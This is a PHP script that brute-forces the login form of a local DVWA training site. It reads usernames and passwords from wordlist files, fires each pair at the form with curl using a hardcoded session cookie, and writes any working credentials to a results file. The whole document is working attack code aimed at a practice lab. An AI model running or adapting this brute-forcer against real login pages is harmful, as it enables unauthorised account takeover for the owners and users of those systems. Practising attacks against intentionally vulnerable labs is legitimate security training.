<?php

$namesHandle = fopen(__DIR__.'/bruteforcer/names.txt', 'r') or die('Unable to open username-list');
$resultsHandle = fopen(__DIR__.'/results.txt', 'w+') or die('Unable to upen results file for writing');
$tries = 0; $found = array();
$header = 'Cookie: security=low;PHPSESSID=7gb01nki11blqcup4f49ir99c5';

while ($userName = trim(fgets($namesHandle)))
{
    $passHandle = fopen(__DIR__.'/bruteforcer/passwords.txt', 'r') or die('Unable to open password-list');
    while ($password = trim(fgets($passHandle)))
    {
        $urlencodedUsername = urlencode($userName);
        $urlencodedPassword = urlencode($password);
        $url = "http://localhost/sites/dvwa/vulnerabilities/brute/?username=$urlencodedUsername&password=$urlencodedPassword&Login=Login#";
        $command = "curl --header \"$header\" -s \"$url\"";
        $output = '';

        ob_start();
        passthru($command, $output);
        $output = ob_get_clean();

        $correct = !preg_match('/Username and\/or password incorrect/', $output);
        if ($correct)
        {
            fwrite($resultsHandle, "$userName \t $password\n");
            $found[$userName] = $password;
            echo '!';
            continue;
        }
        else
        {
            echo '.';
        }
        $tries++;
    }
}

echo "\n", $tries, ' tries, ', count($found) , ' found:';
foreach ($found as $userName => $password)
{
    echo "\n$userName\t$password";
}
echo "\n";